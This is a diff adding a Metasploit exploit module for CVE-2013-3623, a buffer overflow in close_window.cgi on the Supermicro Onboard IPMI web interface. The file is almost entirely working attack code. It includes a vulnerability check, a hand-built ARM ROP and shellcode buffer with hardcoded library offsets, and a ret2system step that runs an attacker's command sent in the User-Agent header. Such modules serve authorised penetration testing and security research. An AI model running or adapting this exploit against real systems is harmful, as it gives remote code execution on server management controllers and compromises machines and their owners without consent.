@@ -1,0 +1,129 @@
+##
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = GoodRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Supermicro Onboard IPMI close_window.cgi Buffer Overflow',
+      'Description'    => %q{
+        This module exploits a buffer overflow on the Supermicro Onboard IPMI controller web
+        interface. The vulnerability exists on the close_window.cgi CGI application, and is due
+        to the insecure usage of strcpy. In order to get a session, the module will execute
+        system() from libc with an arbitrary CMD payload sent on the User-Agent header. This
+        module has been tested successfully on Supermicro Onboard IPMI (X9SCL/X9SCM) with firmware
+        SMT_X9_214.
+      },
+      'Author'         =>
+        [
+          'hdm', # Vulnerability Discovery and Metasploit module
+          'juan vazquez' # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'Payload'        =>
+        {
+          'Space'       => 8000, # Payload sent on the user agent, long enough to fit any payload
+          'DisableNops' => true,
+          'BadChars'    => (0x00..0x1f).to_a.pack("C*"), # not a big deal, we're working with ARCH_CMD payloads
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic openssl'
+            }
+        },
+      'Platform'       => ['unix'],
+      'Arch'           => ARCH_CMD,
+      'References'     =>
+        [
+          [ 'CVE', '2013-3623' ],
+          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2013/11/06/supermicro-ipmi-firmware-vulnerabilities' ]
+        ],
+      'Targets'        =>
+        [
+          [ 'Supermicro Onboard IPMI (X9SCL/X9SCM) with firmware SMT_X9_214',
+            {
+              :callback => :target_smt_x9_214
+            }
+          ]
+        ],
+      'DisclosureDate' => 'Nov 06 2013',
+      'DefaultTarget' => 0))
+
+  end
+
+  def send_close_window_request(sess, agent = rand_text_alpha(8))
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri' => "/cgi/close_window.cgi",
+      'agent' => rand_text_alpha(16) + agent,
+      'encode_params' => false,
+      'vars_post' => {
+        'sess_sid' => sess
+      }
+    })
+
+    return res
+  end
+
+
+  def check
+    safe_check = rand_text_alpha(20)
+    trigger_check = rand_text_alpha(132)
+
+    res = send_close_window_request(safe_check)
+
+    unless res and res.code == 200 and res.body.to_s =~ /Can't find action/
+      return Exploit::CheckCode::Unknown
+    end
+
+    res = send_close_window_request(trigger_check)
+
+    unless res and res.code == 500
+      return Exploit::CheckCode::Safe
+    end
+
+    return Exploit::CheckCode::Vulnerable
+  end
+
+  def target_smt_x9_214
+    base_crypt = 0x40074000 # libcrypto.so.0.9.8
+    base_libc  = 0x40554000 # libc-2.3.5.so
+
+    buf =  rand_text_alpha(68)
+    buf << rand_text_alpha(4)                  # r10
+    buf << rand_text_alpha(4)                  # r11
+    buf << rand_text_alpha(4)                  # sp
+    buf << [base_crypt + 0x39598].pack("V")    # pc # mov pc, r4
+    # 2nd stage
+    buf << "\x68\xd0\x84\xe2"                  # add   sp, r4, 104                  # make sp point to controlled data in order to accomplish the "ret2system"
+    offset = ssl ? 208 : 204                   # when ssl there is an additional environment variable "HTTPS=on"
+    buf << [offset].pack("C") + "\x50\x84\xe2" # add   r5, r4, 204                  # make r5 point to pointer to envp
+    buf << "\x70\x40\xb5\xe8"                  # ldmfd r5!, {r4, r5, r6, ls}        # store on r4 pointer to envp USER_AGENT pointer
+    buf << "\x20\x40\x84\xe2"                  # add   r4, r4, 32                   # to skip the "HTTP_USER_AGENT=" substring and avoid bachars on emulated environment
+    buf << "\x40\x80\xbd\xe8"                  # ldmfd sp!, {r6, pc}
+    buf << rand_text_alpha(4)                  # R6
+    buf << [ base_crypt + 0x3A8BC ].pack("V")  # mov   r0, r4; ldmfd   sp!, {r4,pc} # store in r0 pointer to command
+    buf << rand_text_alpha(4)                  # r4
+    buf << [ base_libc + 0x3617c ].pack("V")   # system at libc
+    buf << rand_text_alpha(128-buf.length)     # padding to reach memory which allows to control r4 when overflow occurs
+    # 1st stage: adjust r4 and pc
+    buf << "\x80\x40\x44\xe2"                  # sub r4, r4,-128                   # make r4 point to the start of the buffer
+    buf << "\x54\xf0\x84\xe2"                  # add pc, r4, 84                    # give control to 2nd stage
+
+    return buf
+  end
+
+  def exploit
+    buffer = self.send(target[:callback])
+    print_status("#{peer} - Sending exploit...")
+    send_close_window_request(buffer, payload.encoded)
+  end
+
+end
